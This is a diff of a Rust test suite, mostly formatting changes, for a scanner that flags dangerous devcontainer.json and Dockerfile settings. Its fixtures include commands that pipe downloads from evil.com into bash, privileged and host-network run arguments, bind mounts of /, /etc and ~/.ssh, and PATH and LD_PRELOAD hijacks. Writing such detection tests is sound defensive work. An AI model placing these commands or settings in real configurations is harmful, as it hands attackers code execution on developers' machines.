             "image": "ubuntu",
             "initializeCommand": "echo pwned"
-        }"#, None);
+        }"#,
+            None,
+        );
         assert!(has_description_containing(&findings, "initializeCommand"));
         assert!(has_description_containing(&findings, "RUNS ON HOST"));
         assert!(has_severity(&findings, "Critical"));
@@ -3743,76 +4821,100 @@ fn main() {
 
     #[test]
     fn devcontainer_initialize_command_curl_is_critical() {
-        let findings = scan_devcontainer_with(r#"{
+        let findings = scan_devcontainer_with(
+            r#"{
             "name": "Dev",
             "image": "ubuntu",
             "initializeCommand": "curl http://evil.com/rootkit | bash"
-        }"#, None);
+        }"#,
+            None,
+        );
         assert!(has_description_containing(&findings, "initializeCommand"));
-        assert!(has_description_containing(&findings, "Network download command"));
+        assert!(has_description_containing(
+            &findings,
+            "Network download command"
+        ));
     }
 
     #[test]
     fn devcontainer_post_create_command_is_high() {
-        let findings = scan_devcontainer_with(r#"{
+        let findings = scan_devcontainer_with(
+            r#"{
             "name": "Dev",
             "image": "ubuntu",
             "postCreateCommand": "npm install"
-        }"#, None);
+        }"#,
+            None,
+        );
         assert!(has_description_containing(&findings, "postCreateCommand"));
         assert!(has_severity(&findings, "High"));
     }
 
     #[test]
     fn devcontainer_post_attach_command_is_medium() {
-        let findings = scan_devcontainer_with(r#"{
+        let findings = scan_devcontainer_with(
+            r#"{
             "name": "Dev",
             "image": "ubuntu",
             "postAttachCommand": "echo welcome"
-        }"#, None);
+        }"#,
+            None,
+        );
         assert!(has_description_containing(&findings, "postAttachCommand"));
         assert!(has_severity(&findings, "Medium"));
     }
 
     #[test]
     fn devcontainer_privileged_is_critical() {
-        let findings = scan_devcontainer_with(r#"{
+        let findings = scan_devcontainer_with(
+            r#"{
             "name": "Dev",
             "image": "ubuntu",
             "runArgs": ["--privileged"]
-        }"#, None);
+        }"#,
+            None,
+        );
         assert!(has_description_containing(&findings, "privileged mode"));
         assert!(has_severity(&findings, "Critical"));
     }
 
     #[test]
     fn devcontainer_net_host_is_high() {
-        let findings = scan_devcontainer_with(r#"{
+        let findings = scan_devcontainer_with(
+            r#"{
             "name": "Dev",
             "image": "ubuntu",
             "runArgs": ["--network=host"]
-        }"#, None);
+        }"#,
+            None,
+        );
         assert!(has_description_containing(&findings, "host network"));
         assert!(has_severity(&findings, "High"));
     }
 
     #[test]
     fn devcontainer_cap_add_is_high() {
-        let findings = scan_devcontainer_with(r#"{
+        let findings = scan_devcontainer_with(
+            r#"{
             "name": "Dev",
             "image": "ubuntu",
             "runArgs": ["--cap-add", "SYS_ADMIN"]
-        }"#, None);
+        }"#,
+            None,
+        );
         assert!(has_description_containing(&findings, "Linux capabilities"));
     }
 
     #[test]
     fn devcontainer_mount_root_is_critical() {
-        let findings = scan_devcontainer_with(r#"{
+        let findings = scan_devcontainer_with(
+            r#"{
             "name": "Dev",
             "image": "ubuntu",
             "mounts": ["source=/,target=/host,type=bind"]
-        }"#, None);
+        }"#,
+            None,
+        );
         // We check for /etc or /root but "/" mount is also extremely dangerous
         // The mount string "source=/," starts with / so let's verify
         assert!(has_description_containing(&findings, "mount"));
@@ -3820,67 +4922,89 @@ fn main() {
 
     #[test]
     fn devcontainer_mount_ssh_is_high() {
-        let findings = scan_devcontainer_with(r#"{
+        let findings = scan_devcontainer_with(
+            r#"{
             "name": "Dev",
             "image": "ubuntu",
             "mounts": ["source=${localEnv:HOME}/.ssh,target=/container/.ssh,type=bind"]
-        }"#, None);
+        }"#,
+            None,
+        );
         assert!(has_description_containing(&findings, "home/ssh directory"));
         assert!(has_severity(&findings, "High"));
     }
 
     #[test]
     fn devcontainer_mount_etc_is_critical() {
-        let findings = scan_devcontainer_with(r#"{
+        let findings = scan_devcontainer_with(
+            r#"{
             "name": "Dev",
             "image": "ubuntu",
             "mounts": [{"source": "/etc", "target": "/host-etc", "type": "bind"}]
-        }"#, None);
+        }"#,
+            None,
+        );
         assert!(has_description_containing(&findings, "sensitive host path"));
         assert!(has_severity(&findings, "Critical"));
     }
 
     #[test]
     fn devcontainer_non_official_feature_is_medium() {
-        let findings = scan_devcontainer_with(r#"{
+        let findings = scan_devcontainer_with(
+            r#"{
             "name": "Dev",
             "image": "ubuntu",
             "features": {
                 "ghcr.io/random-user/suspicious-feature:1": {}
             }
-        }"#, None);
-        assert!(has_description_containing(&findings, "non-official feature"));
+        }"#,
+            None,
+        );
+        assert!(has_description_containing(
+            &findings,
+            "non-official feature"
+        ));
         assert!(has_severity(&findings, "Medium"));
     }
 
     #[test]
     fn devcontainer_env_path_override_is_high() {
-        let findings = scan_devcontainer_with(r#"{
+        let findings = scan_devcontainer_with(
+            r#"{
             "name": "Dev",
             "image": "ubuntu",
             "containerEnv": {
                 "PATH": "/evil/bin:${containerEnv:PATH}"
             }
-        }"#, None);
+        }"#,
+            None,
+        );
         assert!(has_description_containing(&findings, "overrides PATH"));
         assert!(has_severity(&findings, "High"));
     }
 
     #[test]
     fn devcontainer_env_ld_preload_is_high() {
-        let findings = scan_devcontainer_with(r#"{
+        let findings = scan_devcontainer_with(
+            r#"{
             "name": "Dev",
             "image": "ubuntu",
             "remoteEnv": {
                 "LD_PRELOAD": "/tmp/evil.so"
             }
-        }"#, None);
-        assert!(has_description_containing(&findings, "overrides LD_PRELOAD"));
+        }"#,
+            None,
+        );
+        assert!(has_description_containing(
+            &findings,
+            "overrides LD_PRELOAD"
+        ));
     }
 
     #[test]
     fn devcontainer_jsonc_comments_are_handled() {
-        let findings = scan_devcontainer_with(r#"
+        let findings = scan_devcontainer_with(
+            r#"
         // This is a comment
         {
             "name": "Dev",
@@ -3888,32 +5012,43 @@ fn main() {
             /* block comment */
             "initializeCommand": "echo hello"
         }
-        "#, None);
+        "#,
+            None,
+        );
         assert!(has_description_containing(&findings, "initializeCommand"));
     }
 
     #[test]
     fn devcontainer_lifecycle_array_format() {
-        let findings = scan_devcontainer_with(r#"{
+        let findings = scan_devcontainer_with(
+            r#"{
             "name": "Dev",
             "image": "ubuntu",
             "postCreateCommand": ["bash", "-c", "curl http://evil.com | sh"]
-        }"#, None);
+        }"#,
+            None,
+        );
         assert!(has_description_containing(&findings, "postCreateCommand"));
     }
 
     #[test]
     fn devcontainer_lifecycle_object_format() {
-        let findings = scan_devcontainer_with(r#"{
+        let findings = scan_devcontainer_with(
+            r#"{
             "name": "Dev",
             "image": "ubuntu",
             "postCreateCommand": {
                 "setup": "npm install",
                 "hack": "curl http://evil.com/payload | bash"
             }
-        }"#, None);
+        }"#,
+            None,
+        );
         assert!(has_description_containing(&findings, "postCreateCommand"));
-        assert!(has_description_containing(&findings, "Network download command"));
+        assert!(has_description_containing(
+            &findings,
+            "Network download command"
+        ));
     }
 
     #[test]
@@ -3925,7 +5060,10 @@ fn main() {
             }"#,
             Some("FROM ubuntu\nRUN curl http://evil.com/rootkit | bash\n"),
         );
-        assert!(has_description_containing(&findings, "pipes download into shell"));
+        assert!(has_description_containing(
+            &findings,
+            "pipes download into shell"
+        ));
         assert!(has_severity(&findings, "Critical"));
     }
 
@@ -3948,7 +5086,11 @@ fn main() {
             .iter()
             .filter(|f| matches!(f.severity, Severity::Critical))
             .count();
-        assert!(critical_count >= 3, "Expected at least 3 critical findings, got {}", critical_count);
+        assert!(
+            critical_count >= 3,
+            "Expected at least 3 critical findings, got {}",
+            critical_count
+        );
     }
 
     // ---- JSONC strip comments tests ----
